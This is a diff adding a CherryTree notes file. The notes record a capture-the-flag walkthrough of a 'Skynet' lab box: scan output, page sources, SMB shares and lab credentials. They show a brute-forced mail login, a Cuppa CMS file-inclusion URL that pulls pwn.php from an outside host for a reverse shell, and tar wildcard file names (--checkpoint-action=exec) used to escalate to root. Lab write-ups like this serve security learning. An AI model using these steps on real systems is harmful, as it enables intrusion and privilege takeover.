@@ -1,0 +1,415 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Skynet" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870202" ts_lastsave="1631873480">
+    <node name="nmap" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870453" ts_lastsave="1631870810">
+      <rich_text>22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
+139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
+445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</rich_text>
+    </node>
+    <node name="80:http:Apache httpd 2.4.18" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870469" ts_lastsave="1631872612">
+      <rich_text>- dirsearcher
+[05:22:50] 301 -  312B  - /admin  -&gt;  </rich_text>
+      <rich_text link="webs http://10.10.241.26/admin/">http://10.10.241.26/admin/</rich_text>
+      <rich_text>            
+[05:22:50] 403 -  277B  - /admin/?/login                                    
+[05:22:50] 403 -  277B  - /admin/
+[05:22:50] 403 -  277B  - /admin/.htaccess                                  
+[05:23:01] 301 -  313B  - /config  -&gt;  </rich_text>
+      <rich_text link="webs http://10.10.241.26/config/">http://10.10.241.26/config/</rich_text>
+      <rich_text>          
+[05:23:01] 403 -  277B  - /config/                                          
+[05:23:02] 301 -  310B  - /css  -&gt;  </rich_text>
+      <rich_text link="webs http://10.10.241.26/css/">http://10.10.241.26/css/</rich_text>
+      <rich_text>                
+[05:23:09] 200 -  523B  - /index.html                                       
+[05:23:10] 403 -  277B  - /js/                                              
+[05:23:22] 403 -  277B  - /server-status/                                   
+[05:23:22] 403 -  277B  - /server-status                                    
+[05:23:25] 301 -  319B  - /squirrelmail  -&gt;  </rich_text>
+      <rich_text link="webs http://10.10.241.26/squirrelmail/">http://10.10.241.26/squirrelmail/</rich_text>
+      <rich_text>
+
+[05:56:05] 200 -    5KB - /45kra24zxs28v3yd/administrator/                  
+[05:56:05] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php         
+[05:56:18] 200 -  418B  - /45kra24zxs28v3yd/index.html   </rich_text>
+      <node name="/" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870524" ts_lastsave="1631870525">
+        <rich_text scale="h1">Source Code</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTML</rich_text>
+        <rich_text>
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;link rel="stylesheet" type="text/css" href="</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/style.css">style.css</rich_text>
+        <rich_text>"&gt;
+		&lt;link rel="shortcut icon" type="image/png" href="</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/favicon.ico">favicon.ico</rich_text>
+        <rich_text>"/&gt;
+		&lt;title&gt;Skynet&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;div&gt;
+			&lt;img src="</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/image.png">image.png</rich_text>
+        <rich_text>"/&gt;
+			&lt;form name="skynet" action="</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/#">#</rich_text>
+        <rich_text>" method="POST"&gt;&lt;br&gt;
+				&lt;input type="search" class="search"&gt;&lt;br&gt;
+				&lt;input type="submit" class="button" name="submit" value="Skynet Search"&gt;
+				&lt;input type="submit" class="button" name="lucky" value="I'm Feeling Lucky"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+	&lt;/body&gt;
+&lt;/html&gt;</rich_text>
+      </node>
+      <node name="/admin/" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870656" ts_lastsave="1631870662">
+        <rich_text>- get /admin/ 403</rich_text>
+      </node>
+      <node name="/config/" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870679" ts_lastsave="1631870681">
+        <rich_text>- GET /config/ 403</rich_text>
+      </node>
+      <node name="/squirrelmail/" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870730" ts_lastsave="1631871888">
+        <rich_text scale="h1">Source Code</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTTP:</rich_text>
+        <rich_text>
+
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;
+
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;meta name="robots" content="noindex,nofollow"&gt;
+&lt;meta http-equiv="x-dns-prefetch-control" content="off"&gt;
+&lt;script type="text/javascript" language="JavaScript"&gt;
+&lt;!--
+if (self != top) { try { if (document.domain != top.document.domain) { throw "Clickjacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe) */ } } catch (e) { self.location = "/squirrelmail/src/signout.php"; top.location = "/squirrelmail/src/signout.php" } }
+// --&gt;
+&lt;/script&gt;
+
+&lt;title&gt;SquirrelMail - Login&lt;/title&gt;&lt;script language="JavaScript" type="text/javascript"&gt;
+&lt;!--
+  var alreadyFocused = false;
+  function squirrelmail_loginpage_onload() {
+    document.login_form.js_autodetect_results.value = '1';
+    if (alreadyFocused) return;
+    var textElements = 0;
+    for (i = 0; i &lt; document.login_form.elements.length; i++) {
+      if (document.login_form.elements[i].type == "text" || document.login_form.elements[i].type == "password") {
+        textElements++;
+        if (textElements == 1) {
+          document.login_form.elements[i].focus();
+          break;
+        }
+      }
+    }
+  }
+// --&gt;
+&lt;/script&gt;
+
+&lt;!--[if IE 6]&gt;
+&lt;style type="text/css"&gt;
+/* avoid stupid IE6 bug with frames and scrollbars */
+body {
+    width: expression(document.documentElement.clientWidth - 30);
+}
+&lt;/style&gt;
+&lt;![endif]--&gt;
+
+&lt;/head&gt;
+
+&lt;body text="#000000" bgcolor="#ffffff" link="#0000cc" vlink="#0000cc" alink="#0000cc" onLoad="squirrelmail_loginpage_onload();"&gt;
+&lt;form action="</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/squirrelmail/src/redirect.php">redirect.php</rich_text>
+        <rich_text>" method="post" name="login_form"  &gt;
+&lt;table bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0" width="100%"&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;center&gt;&lt;img src="</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/squirrelmail/images/sm_logo.png">../images/sm_logo.png</rich_text>
+        <rich_text>" alt="SquirrelMail Logo" width="308" height="111" /&gt;&lt;br /&gt;
+&lt;small&gt;SquirrelMail version 1.4.23 [SVN]&lt;br /&gt;
+  By the SquirrelMail Project Team&lt;br /&gt;&lt;/small&gt;
+&lt;table bgcolor="#ffffff" border="0" width="350"&gt;&lt;tr&gt;&lt;td bgcolor="#dcdcdc" align="center"&gt;&lt;b&gt;SquirrelMail Login&lt;/b&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;&lt;td bgcolor="#ffffff" align="left"&gt;
+&lt;table bgcolor="#ffffff" align="center" border="0" width="100%"&gt;&lt;tr&gt;&lt;td align="right" width="30%"&gt;Name:&lt;/td&gt;
+&lt;td align="left" width="70%"&gt;&lt;input type="text" name="login_username" value="" onfocus="alreadyFocused=true;" /&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;&lt;td align="right" width="30%"&gt;Password:&lt;/td&gt;
+&lt;td align="left" width="70%"&gt;&lt;input type="password" name="secretkey" onfocus="alreadyFocused=true;" /&gt;
+&lt;input type="hidden" name="js_autodetect_results" value="0" /&gt;
+&lt;input type="hidden" name="just_logged_in" value="1" /&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;&lt;td align="left"&gt;&lt;center&gt;&lt;input type="submit" value="Login" /&gt;
+&lt;/center&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/center&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;
+</rich_text>
+        <node name="/src/webmail.php" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631871888" ts_lastsave="1631871952">
+          <rich_text>- smb password for milesdyson:)s{A&amp;2Z=F^n_E.B`</rich_text>
+        </node>
+      </node>
+      <node name="Exploits" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631871811" ts_lastsave="1631873449">
+        <rich_text>- using milesdyson and log1.txt to bruteforce login at squirrelmail
+   → worked
+- using Cuppa CMS
+   → found exploit </rich_text>
+        <rich_text link="webs https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</rich_text>
+        <rich_text>
+   → works with url </rich_text>
+        <rich_text link="webs http://10.10.241.26/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.213.132:80/pwn.php">http://10.10.241.26/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.213.132:80/pwn.php</rich_text>
+        <rich_text>
+   → got reverse shell
+      ⇒ found user.txt with flag</rich_text>
+      </node>
+      <node name="/45kra24zxs28v3yd" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631872415" ts_lastsave="1631872725">
+        <rich_text>&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+body {
+  color: white;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body bgcolor="black"&gt;
+&lt;center&gt;&lt;br /&gt;
+&lt;img src='</rich_text>
+        <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/miles.jpg">miles.jpg</rich_text>
+        <rich_text>'&gt;
+&lt;h2&gt;Miles Dyson Personal Page&lt;/h2&gt;&lt;p&gt;Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,&lt;br /&gt; a computer A.I. intended to control electronically linked weapons and defend the United States.&lt;/p&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+- cuppa cms</rich_text>
+        <node name="/administrator/" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631872621" ts_lastsave="1631872648">
+          <rich_text>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+    &lt;head&gt;
+        &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
+&lt;title&gt;Cuppa CMS&lt;/title&gt;
+&lt;!-- Principals Packages  --&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/tu_main.css">templates/default/css/tu_main.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/template.css">templates/default/css/template.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/jquery-ui.css">templates/default/css/jquery-ui.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/uploadify/uploadify.css">js/uploadify/uploadify.css</rich_text>
+          <rich_text>" type="text/css" rel="stylesheet" /&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/jquery.js">js/jquery.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/jquery-ui.js">js/jquery-ui.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/jquery.validate.js">js/jquery.validate.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/jquery.md5.js">js/jquery.md5.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/jquery.sha1.js">js/jquery.sha1.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/uploadify/jquery.uploadify.js">js/uploadify/jquery.uploadify.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce.js">js/tiny_mce/tiny_mce.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/swfobject.js">js/swfobject.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/tu_main.js">js/tu_main.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+&lt;!-- Others Packages --&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/alertConfigField.css">templates/default/css/alertConfigField.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/defaultAlert.css">templates/default/css/defaultAlert.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/alertIFrame.css">templates/default/css/alertIFrame.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/alertImage.css">templates/default/css/alertImage.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/dropdown.css">templates/default/css/dropdown.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/datagrid.css">templates/default/css/datagrid.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/form.css">templates/default/css/form.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    &lt;link href="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/css/tools.css">templates/default/css/tools.css</rich_text>
+          <rich_text>" rel="stylesheet" type="text/css"&gt;
+    
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/tu_stringHelp.js">js/tu_stringHelp.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/tu_comboBoxHelp.js">js/tu_comboBoxHelp.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/tu_checkBoxHelp.js">js/tu_checkBoxHelp.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;
+    &lt;script src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/js/tu_functions.js">js/tu_functions.js</rich_text>
+          <rich_text>" type="text/javascript"&gt;&lt;/script&gt;    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;style type="text/css"&gt;
+	body{
+		height:100%;
+		background:url(templates/default/images/template/login/login_bg.jpg);
+		background-position: center 0px;
+	}
+&lt;/style&gt;
+&lt;div class="login" id="login"&gt;
+	&lt;div class="logo"&gt;&lt;/div&gt;
+    &lt;div class="login_box"&gt;
+    	&lt;form id="form_login" method="post" style="display:block"&gt;
+            &lt;div class="comment"&gt;Use a valid username and password to gain access to the administrator&lt;/div&gt;
+            &lt;table class="table" style="width:400px;"&gt;
+                &lt;tr&gt;
+                    &lt;td style="font-weight:bold"&gt;Username&lt;/td&gt;
+                    &lt;td&gt;&lt;input type="text" name="user" id="user" class="input" value="" /&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;tr&gt;
+                    &lt;td style="font-weight:bold"&gt;Password&lt;/td&gt;
+                    &lt;td&gt;&lt;input type="password" name="password" id="password" class="input" value="" /&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;tr&gt;
+                    &lt;td&gt;&lt;/td&gt;
+                    &lt;td&gt;&lt;input class="button_submit" type="submit" value="" /&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;input type="hidden" id="task" name="task" value="login"/&gt;
+            &lt;/table&gt;
+            &lt;!--
+            	&lt;a class="forgot_password" onclick="ShowPanel('forget')"&gt;Forgot Password?&lt;/a&gt;
+            --&gt;
+        &lt;/form&gt;
+		&lt;form id="form_forget" method="post" style="display:none"&gt;
+        	&lt;div class="comment"&gt;Please send us your email and we'll reset your password&lt;/div&gt;
+            &lt;table class="table" style="top:110px; left:90px"&gt;
+                &lt;tr&gt;
+                    &lt;td style="font-weight:bold"&gt;Email address&lt;/td&gt;
+                    &lt;td&gt;&lt;input type="text" name="email" id="email" class="input" value="" /&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;tr&gt;
+                    &lt;td&gt;&lt;/td&gt;
+                    &lt;td&gt;&lt;input class="button_submit" type="submit" value="" /&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;input type="hidden" id="task" name="task" value="forgot"/&gt;
+            &lt;/table&gt;
+            &lt;a class="back_to_login" onclick="ShowPanel('login')"&gt;&lt;img src="</rich_text>
+          <rich_text link="webs http://view-source:http://10.10.241.26/45kra24zxs28v3yd/administrator/templates/default/images/template/login/icon_back_login.png">../administrator/templates/default/images/template/login/icon_back_login.png</rich_text>
+          <rich_text>" style="margin-right:5px;" /&gt;Back to login&lt;/a&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+	function ShowPanel(value){
+		if(value == "login"){
+			jQuery("#form_login").css("display", "block");
+			jQuery("#form_forget").css("display", "none");
+		}else if(value == "forget"){
+			jQuery("#form_login").css('display', "none");
+			jQuery("#form_forget").css("display", "block");
+		}
+	}
+&lt;/script&gt;    &lt;/body&gt;
+&lt;/html&gt;</rich_text>
+        </node>
+      </node>
+    </node>
+    <node name="445:netbios-ssn:Samba smbd 3.X -4.X" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870810" ts_lastsave="1631872320">
+      <rich_text>print$          Disk      Printer Drivers
+anonymous       Disk      Skynet Anonymous Share
+milesdyson      Disk      Miles Dyson Personal Share
+IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
+</rich_text>
+      <node name="/anonymous" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631870962" ts_lastsave="1631871052">
+        <rich_text>  .                                   D        0  Thu Nov 26 11:04:00 2020
+  ..                                  D        0  Tue Sep 17 03:20:17 2019
+  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
+  logs                                D        0  Wed Sep 18 00:42:16 2019
+</rich_text>
+        <rich_text indent="1">  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
+  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
+  log3.txt                            N        0  Wed Sep 18 00:42:16 2019</rich_text>
+        <rich_text>
+</rich_text>
+      </node>
+      <node name="Exploits" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631871182" ts_lastsave="1631872191">
+        <rich_text>- tryingin to login as milesdyson with the log1.txt as passwords
+   → didnt work
+- trying to login as milesdyson to his share with password found in his emails
+   → worked</rich_text>
+      </node>
+      <node name="/milesdyson" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631872320" ts_lastsave="1631872343">
+        <rich_text>- found important.txt
+1. Add features to beta CMS /45kra24zxs28v3yd 
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+- possibly hidden directory /45kra24zxs28v3yd 
+</rich_text>
+      </node>
+    </node>
+    <node name="Credentials" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631871976" ts_lastsave="1631872479">
+      <rich_text>Credentials:
+
+milesdyson:cyborg007haloterminator - squirrelmail
+milesdyson:)s{A&amp;2Z=F^n_E.B` smb password for milesdyson (found in his emails)</rich_text>
+    </node>
+    <node name="Privilege Escalation" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631873480" ts_lastsave="1631875541">
+      <rich_text>- sudo -l needs password of www-data
+- enumerate with linpeas.sh
+   → */1 *   * * *   root    /home/milesdyson/backups/backup.sh
+      ⇒ #!/bin/bash
+</rich_text>
+      <rich_text indent="1">cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *</rich_text>
+      <rich_text>
+      ⇒ the wildcard can be used to inject parameters to the tar call
+      ⇒ tar allow to define actions in the params that should be executed
+      ⇒ added shell script to /var/www/html that gives sudo rights to www-data without password
+      ⇒ created files with the name --checkpoint-action=exec=sh privesc.sh and --checkpoint=1
+      ⇒ tar executes script
+      ⇒ voila all the privileges
+</rich_text>
+    </node>
+  </node>
+</cherrytree>
